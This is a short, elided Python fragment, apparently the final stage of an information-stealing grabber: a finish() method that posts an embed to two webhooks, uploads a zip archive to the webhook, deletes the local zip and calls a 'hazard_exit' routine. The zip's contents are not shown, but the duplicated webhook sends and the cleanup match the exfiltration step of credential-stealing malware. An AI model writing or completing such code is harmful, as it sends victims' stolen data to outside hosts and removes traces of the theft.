...
def finish(self):
    ...
    with open(_zipfile, "rb") as f:
        if self.hook_reg in self.webhook:
            ...
            httpx.post(self.webhook, json=embed)  # Sending to the first webhook
            httpx.post(self.webhook2, json=embed)  # Sending to the second webhook
            ...
            httpx.post(self.webhook, headers={"Authorization": key}, json=embed)  # Sending to the first webhook
            httpx.post(self.webhook2, headers={"Authorization": key}, json=embed)  # Sending to the second webhook
            httpx.post(
                self.webhook, headers={"Authorization": key}, files={"upload_file": f}
            )
    os.remove(_zipfile)
    self.hazard_exit()
